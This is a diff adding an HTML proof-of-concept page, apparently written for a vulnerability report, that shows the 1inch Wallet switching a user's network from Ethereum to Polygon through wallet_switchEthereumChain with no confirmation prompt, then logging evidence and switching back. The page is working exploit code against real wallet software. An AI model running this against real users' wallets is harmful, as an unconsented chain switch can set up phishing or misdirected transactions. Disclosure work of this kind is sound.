@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>1inch Wallet - Silent Chain Switch PoC v4 (baseline -> attack -> evidence)</title>
+<style>
+body { font-family: monospace; margin: 12px; background: #111; color: #0f0; }
+h2 { color: #fff; }
+#log div { padding: 2px 0; border-bottom: 1px solid #222; }
+.ok { color: #0f0; font-weight: bold; }
+.err { color: #f44; font-weight: bold; }
+.warn { color: #ff0; font-weight: bold; }
+</style>
+</head>
+<body>
+<h2>1inch Wallet - Silent Chain Switch PoC v4</h2>
+<div id="log">loading…</div>
+<script>
+var EL = document.getElementById('log');
+var log = function(s) { var d = document.createElement('div'); d.innerHTML = s; EL.appendChild(d); };
+var OK = function(s) { log('<span class="ok">' + s + '</span>'); };
+var ERR = function(s) { log('<span class="err">' + s + '</span>'); };
+var hexDec = function(h){ try { return String(BigInt(h)); } catch(e){ return h; } };
+
+var CC_EVENTS = [];
+window.addEventListener('load', function(){ setTimeout(run, 300); });
+
+async function run() {
+    var tries = 0;
+    while (!(window.ethereum && window.ethereum.request)) {
+        if (++tries > 10) { ERR('window.ethereum not available'); return; }
+        await new Promise(r => setTimeout(r, 300));
+    }
+    OK('INFO provider ready.');
+
+    if (window.ethereum.on) window.ethereum.on('chainChanged', function(c){
+        CC_EVENTS.push(c);
+        log('EVENT chainChanged → ' + c + ' (dec ' + hexDec(c) + ')');
+    });
+
+    async function chainId(){ return await window.ethereum.request({method:'eth_chainId'}); }
+    async function blockNumber(){ return await window.ethereum.request({method:'eth_blockNumber'}); }
+    async function switchTo(hex){
+        return await window.ethereum.request({method:'wallet_switchEthereumChain', params:[{chainId:hex}]});
+    }
+
+    try {
+        /* 0. Restore known baseline: Ethereum mainnet (0x1). Silent. */
+        log('--- STEP 0: restore baseline to Ethereum (0x1) ---');
+        await switchTo('0x1');
+        log('   baseline restore accepted');
+
+        var base = await chainId();
+        OK('STEP 1 BASELINE eth_chainId = ' + base + ' (dec ' + hexDec(base) + ')');
+
+        /* 2. The silent switch to Polygon — no user confirmation shown */
+        log('--- STEP 2: wallet_switchEthereumChain -> 0x89 (Polygon) ---');
+        var r = await switchTo('0x89');
+        OK('STEP 2 switch RESOLVED without any wallet confirmation. result=' + JSON.stringify(r));
+
+        var after = await chainId();
+        OK('STEP 3 eth_chainId AFTER = ' + after + ' (dec ' + hexDec(after) + ')' + (after==='0x89' ? ' => POLYGON' : ' => unexpected'));
+
+        var bn = await blockNumber();
+        OK('STEP 4 eth_blockNumber AFTER = ' + bn + ' = dec ' + hexDec(bn));
+
+        /* 5. Cleanup: restore the user's original chain. */
+        log('--- STEP 5: cleanup, restore Ethereum (0x1) ---');
+        try { await switchTo('0x1'); log('   cleanup restore accepted'); } catch(e) { log('   cleanup: ' + e.message); }
+
+        log('');
+        log('chainChanged events observed: ' + (CC_EVENTS.length ? CC_EVENTS.join(', ') : '(none)'));
+    } catch (e) {
+        ERR('FAILED: ' + (e && e.message) + (e && e.code !== undefined ? ' (code ' + e.code + ')' : ''));
+    }
+}
+</script>
+</body>
+</html>
